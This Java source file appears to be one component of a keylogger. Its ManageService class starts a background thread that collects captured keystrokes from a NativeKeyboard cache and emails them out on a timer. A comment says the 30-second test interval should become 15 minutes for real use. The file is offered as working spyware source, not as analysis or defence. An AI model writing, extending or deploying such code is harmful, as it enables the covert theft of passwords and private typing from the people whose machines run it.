package handlers;

import keys.NativeKeyboard;

public class ManageService implements Runnable {

    // Declares NativeKeyboard keyboard variable
    private NativeKeyboard keyboard;

    // Declares thread
    private Thread service;

    // Method starts thread and creates object for NativeKeyboard class
    public ManageService() {
        keyboard = new NativeKeyboard();

        // Starts thread
        service = new Thread(this, "Manage Service");
        service.start();

    }

    public NativeKeyboard getKeyboard() {
        return keyboard;
    }

    // This method schedules when to send emails and how to handle errors if something goes wrong.
    // Also handles clearing the cache from the previous session of running this program
    @Override
    public void run() {
        long start = System.nanoTime();
        while (true) {
            long elapsed = (System.nanoTime() - start) / 1000000;
            // Change 30000 to 60000 * 15 when actually running program. This determines how often emails will be sent
            if (elapsed > 30000) {
                try {
                    Sender.sendMail(Utils.cleanPrint(keyboard.getKeyCache()));
                    keyboard.onSend();
                } catch (Throwable e) {
                    keyboard.onFail();
                    throw new RuntimeException(e);
                }

                start = System.nanoTime();
            }
        }
    }
}
